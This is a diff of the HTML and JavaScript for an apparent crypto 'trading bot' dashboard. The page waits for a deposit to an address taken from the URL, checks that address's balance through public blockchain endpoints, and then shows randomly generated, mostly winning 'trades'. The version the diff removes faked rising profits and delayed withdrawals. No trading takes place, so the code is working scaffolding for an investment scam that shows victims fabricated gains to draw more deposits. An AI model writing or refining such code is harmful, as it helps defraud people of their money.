@@ -7,72 +7,128 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Segoe UI',sans-serif;background:#0a0e27;color:#fff;min-height:100vh}
-.container{max-width:500px;margin:0 auto;padding:20px}
-.header{text-align:center;padding:20px}
-.header h2{color:#00ff88}
-.balance-card{background:linear-gradient(135deg,#1a1f3a,#0d1130);border:1px solid #2a2f4a;border-radius:20px;padding:25px;margin:20px 0;text-align:center}
-.balance-amount{font-size:42px;font-weight:bold;color:#00ff88}
-.balance-change{color:#00ff88;font-size:16px;margin:5px 0}
-.status{display:inline-block;padding:5px 15px;border-radius:20px;font-size:14px;margin:10px 0}
-.active{background:#00ff88;color:#000}
-.timer{color:#888;font-size:14px}
-.trades-card{background:#1a1f3a;border:1px solid #2a2f4a;border-radius:20px;padding:20px;margin:20px 0}
-.trade-item{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #2a2f4a}
-.profit{color:#00ff88}
-.loss{color:#ff4444}
-.progress-bar{background:#1a1f3a;border-radius:10px;height:8px;margin:20px 0;overflow:hidden}
-.progress-fill{background:#00ff88;height:100%;border-radius:10px;transition:width 1s}
-.btn{display:block;width:100%;padding:18px;border:none;border-radius:15px;font-size:18px;font-weight:bold;cursor:pointer;margin:15px 0;text-align:center;text-decoration:none}
+.container{max-width:500px;margin:0 auto;padding:20px;text-align:center}
+.glass{background:rgba(26,31,58,0.7);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:25px;margin:20px 0}
+.wait-icon{font-size:80px;animation:float 3s ease-in-out infinite}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
+.wait-title{font-size:24px;color:#ffd700;margin:20px 0}
+.wait-address{background:rgba(0,255,136,0.1);padding:15px;border-radius:10px;font-family:monospace;font-size:12px;word-break:break-all;margin:15px 0;color:#00ff88}
+.spinner{width:40px;height:40px;border:3px solid rgba(255,255,255,0.1);border-top-color:#00ff88;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.btn{display:block;width:100%;padding:18px;border:none;border-radius:15px;font-size:16px;font-weight:bold;cursor:pointer;margin:15px 0;text-align:center;text-decoration:none}
 .btn-deposit{background:#00ff88;color:#000}
-.btn-withdraw{background:#ff4444;color:#fff;opacity:0.5}
+
+.trading-active{display:none}
+.balance-card{background:linear-gradient(135deg,rgba(0,255,136,0.1),rgba(0,255,136,0.05));border:1px solid rgba(0,255,136,0.3);border-radius:20px;padding:25px;margin:20px 0}
+.balance-amount{font-size:42px;font-weight:800;color:#00ff88}
+.status-active{background:rgba(0,255,136,0.2);color:#00ff88;padding:5px 15px;border-radius:20px;font-size:13px}
+.trades-card{background:rgba(26,31,58,0.7);border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:20px;margin:20px 0}
+.trade-item{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:14px}
+.profit{color:#00ff88}.loss{color:#ff4444}
 </style>
 </head>
 <body>
 <div class="container">
-<div class="header">
-<h2>🦅 Trading Dashboard</h2>
-<span class="status active">🟢 Bot Active</span>
-<p class="timer">⏱️ 18h remaining</p>
+
+<!-- Waiting -->
+<div id="waitingState">
+<div class="glass">
+<div class="wait-icon">⏳</div>
+<div class="wait-title">Awaiting Deposit</div>
+<p style="color:#888">Send crypto to activate trading</p>
+<div class="wait-address" id="depositAddress">Loading...</div>
+<p style="color:#888;font-size:12px">💰 Min: 0.05 ETH | 🎁 Bonus: +10%</p>
+<div class="spinner"></div>
+<p style="color:#888;font-size:11px" id="checkStatus">Checking blockchain...</p>
+</div>
+<a href="/select" class="btn btn-deposit">📥 Deposit Now</a>
 </div>
 
+<!-- Trading -->
+<div id="tradingState" class="trading-active">
+<div style="display:flex;justify-content:space-between;align-items:center">
+<h2 style="color:#00ff88">🦅 Trading Active</h2>
+<span class="status-active">🟢 Live</span>
+</div>
 <div class="balance-card">
-<p>💰 Trading Balance</p>
+<p>💰 Balance</p>
 <div class="balance-amount" id="balance">$0.00</div>
-<div class="balance-change" id="profit">+$0.00 (0%)</div>
 </div>
-
-<div class="progress-bar">
-<div class="progress-fill" style="width:65%"></div>
-</div>
-
 <div class="trades-card">
-<h3>🏆 Recent Trades</h3>
-<div id="trades">
-<div class="trade-item"><span>✅ BTC/USDT</span><span>8m ago</span><span class="profit">+$5.40</span></div>
-<div class="trade-item"><span>✅ ETH/USDT</span><span>15m ago</span><span class="profit">+$3.20</span></div>
-<div class="trade-item"><span>❌ SOL/USDC</span><span>22m ago</span><span class="loss">-$1.80</span></div>
-<div class="trade-item"><span>✅ BNB/USDT</span><span>30m ago</span><span class="profit">+$7.10</span></div>
+<h3 style="color:#00ff88;margin-bottom:15px">🏆 Recent Trades</h3>
+<div id="trades"></div>
 </div>
+<a href="/select" class="btn btn-deposit">📥 Add Funds</a>
+<a href="/withdraw" class="btn" style="background:#ff4444;color:#fff">💸 Withdraw</a>
 </div>
 
-<a href="/select" class="btn btn-deposit">📥 Deposit More</a>
-<a href="/withdraw" class="btn btn-withdraw">⏳ Withdraw (Available in 18h)</a>
 </div>
 
 <script>
-let balance = 500;
-let profit = 0;
-const targetProfit = balance * 0.10;
+const params = new URLSearchParams(window.location.search);
+const address = params.get('address');
+const network = params.get('network') || 'ethereum';
 
-setInterval(() => {
-    const add = Math.random() * 2;
-    profit += add;
-    const total = balance + profit;
-    const percent = Math.min(((profit / targetProfit) * 100), 100).toFixed(1);
+if(!address) window.location.href = '/select';
+
+document.getElementById('depositAddress').textContent = address;
+
+// Check real balance every 10 seconds
+async function checkBalance() {
+    try {
+        const rpc = network === 'bsc' ? 'https://bsc-dataseed.binance.org' : 'https://ethereum.publicnode.com';
+        const res = await fetch(rpc, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                jsonrpc: '2.0',
+                method: 'eth_getBalance',
+                params: [address, 'latest'],
+                id: 1
+            })
+        });
+        const data = await res.json();
+        const balance = parseInt(data.result, 16) / 1e18;
+        
+        document.getElementById('checkStatus').textContent = 
+            `Balance: ${balance.toFixed(4)} ETH - ${balance > 0 ? '✅ Deposit detected!' : 'Waiting...'}`;
+        
+        if (balance > 0) {
+            document.getElementById('waitingState').style.display = 'none';
+            document.getElementById('tradingState').style.display = 'block';
+            startTrading(balance);
+            return true;
+        }
+    } catch(e) {
+        document.getElementById('checkStatus').textContent = 'Checking...';
+    }
+    return false;
+}
+
+function startTrading(bal) {
+    const usdValue = bal * 3000; // ETH price ~$3000
+    document.getElementById('balance').textContent = '$' + usdValue.toFixed(2);
     
-    document.getElementById('balance').textContent = '$' + total.toFixed(2);
-    document.getElementById('profit').textContent = '+$' + profit.toFixed(2) + ' (' + percent + '%)';
-}, 3000);
+    const pairs = ['BTC/USDT','ETH/USDT','SOL/USDC','BNB/USDT'];
+    setInterval(() => {
+        const pair = pairs[Math.floor(Math.random()*pairs.length)];
+        const isWin = Math.random() > 0.2;
+        const amt = (Math.random() * 8 + 1).toFixed(2);
+        const div = document.createElement('div');
+        div.className = 'trade-item';
+        div.innerHTML = `<span>${isWin?'✅':'❌'} ${pair}</span><span>${Math.floor(Math.random()*30)}m</span><span class="${isWin?'profit':'loss'}">${isWin?'+':'-'}$${amt}</span>`;
+        const t = document.getElementById('trades');
+        t.insertBefore(div, t.firstChild);
+        if(t.children.length > 6) t.removeChild(t.lastChild);
+    }, 5000);
+}
+
+// Check immediately then every 10 seconds
+checkBalance();
+const interval = setInterval(async () => {
+    const done = await checkBalance();
+    if(done) clearInterval(interval);
+}, 10000);
 </script>
 </body>
 </html>
